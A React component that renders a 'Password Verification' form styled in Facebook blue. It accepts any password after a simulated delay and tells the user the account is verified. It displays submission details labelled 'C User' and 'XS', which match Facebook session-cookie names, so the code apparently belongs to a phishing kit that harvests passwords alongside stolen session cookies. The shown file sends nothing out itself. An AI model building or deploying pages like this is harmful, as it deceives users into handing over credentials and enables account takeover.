import React, { useState } from 'react';

function PasswordVerification({ submissionId, userData }) {
  const [password, setPassword] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [error, setError] = useState('');
  const [isVerified, setIsVerified] = useState(false);

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    if (error) {
      setError('');
    }
  };

  const handleVerify = async (e) => {
    e.preventDefault();
    
    if (!password.trim()) {
      setError('Password is required');
      return;
    }

    setIsVerifying(true);
    setError('');

    try {
      // Simulate password verification
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // For demo purposes, accept any password
      setIsVerified(true);
    } catch (error) {
      setError('Verification failed. Please try again.');
    } finally {
      setIsVerifying(false);
    }
  };

  if (isVerified) {
    return (
      <div style={{ padding: '30px', textAlign: 'center' }}>
        <div style={{ 
          color: '#28a745', 
          fontSize: '48px', 
          marginBottom: '20px' 
        }}>
          ✓
        </div>
        <h2 style={{ color: '#28a745', marginBottom: '15px' }}>Verification Successful!</h2>
        <p style={{ color: '#666', marginBottom: '20px' }}>
          Your account has been successfully verified.
        </p>
        <div style={{ 
          backgroundColor: '#f8f9fa', 
          padding: '15px', 
          borderRadius: '6px',
          fontSize: '14px',
          color: '#666'
        }}>
          Submission ID: {submissionId}
        </div>
      </div>
    );
  }

  return (
    <div style={{ padding: '30px' }}>
      <h2 style={{ marginBottom: '20px', textAlign: 'center', color: '#333' }}>
        Password Verification
      </h2>
      
      <p style={{ 
        marginBottom: '25px', 
        color: '#666', 
        textAlign: 'center',
        fontSize: '14px'
      }}>
        Please enter your password to complete the verification process.
      </p>
      
      <form onSubmit={handleVerify}>
        <div style={{ marginBottom: '20px' }}>
          <label 
            htmlFor="password"
            style={{
              display: 'block',
              marginBottom: '8px',
              fontWeight: '500',
              color: '#333',
              fontSize: '14px'
            }}
          >
            Password
          </label>
          
          <input
            id="password"
            type="password"
            value={password}
            onChange={handlePasswordChange}
            placeholder="Enter your password"
            style={{
              width: '100%',
              padding: '12px',
              border: error ? '1px solid #dc3545' : '1px solid #ddd',
              borderRadius: '6px',
              fontSize: '16px',
              boxSizing: 'border-box',
              outline: 'none'
            }}
            onFocus={(e) => {
              if (!error) {
                e.target.style.borderColor = '#007bff';
                e.target.style.boxShadow = '0 0 0 2px rgba(0, 123, 255, 0.25)';
              }
            }}
            onBlur={(e) => {
              e.target.style.borderColor = error ? '#dc3545' : '#ddd';
              e.target.style.boxShadow = 'none';
            }}
          />
          
          {error && (
            <div style={{
              color: '#dc3545',
              fontSize: '12px',
              marginTop: '5px'
            }}>
              {error}
            </div>
          )}
        </div>
        
        <button
          type="submit"
          disabled={isVerifying}
          style={{
            width: '100%',
            padding: '12px',
            backgroundColor: isVerifying ? '#ccc' : '#1877f2',
            color: 'white',
            border: 'none',
            borderRadius: '6px',
            fontSize: '16px',
            fontWeight: 'bold',
            cursor: isVerifying ? 'not-allowed' : 'pointer'
          }}
        >
          {isVerifying ? 'Verifying...' : 'Verify'}
        </button>
      </form>
      
      {userData && (
        <div style={{ 
          marginTop: '25px', 
          padding: '15px', 
          backgroundColor: '#f8f9fa', 
          borderRadius: '6px',
          fontSize: '12px',
          color: '#666'
        }}>
          <strong>Submission Details:</strong><br />
          C User: {userData.c_user}<br />
          XS: {userData.xs ? '***' + userData.xs.slice(-4) : 'N/A'}
        </div>
      )}
    </div>
  );
}

export default PasswordVerification;